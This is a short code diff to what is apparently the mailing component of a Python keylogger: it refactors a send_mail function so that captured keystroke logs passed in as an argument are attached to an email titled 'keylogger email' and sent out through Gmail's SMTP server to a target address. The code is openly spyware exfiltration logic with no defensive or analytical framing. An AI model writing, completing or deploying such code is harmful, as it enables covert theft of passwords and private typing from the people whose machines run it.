@@ -1,10 +1,8 @@
-import keylogger
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
-
-def send_mail():
+def send_mail(logs):
     """This function is needed in order to send the logs to a target email"""
 
     msg = MIMEMultipart()
@@ -13,7 +11,7 @@ def send_mail():
     msg['Subject'] = 'keylogger email' 
 
     #add logs to the mail contents
-    msg.attach(MIMEText(keylogger.logString))
+    msg.attach(MIMEText(logs))
     mailserver = smtplib.SMTP('smtp.gmail.com', 587)
     # identify ourselves to smtp gmail client
     mailserver.ehlo()
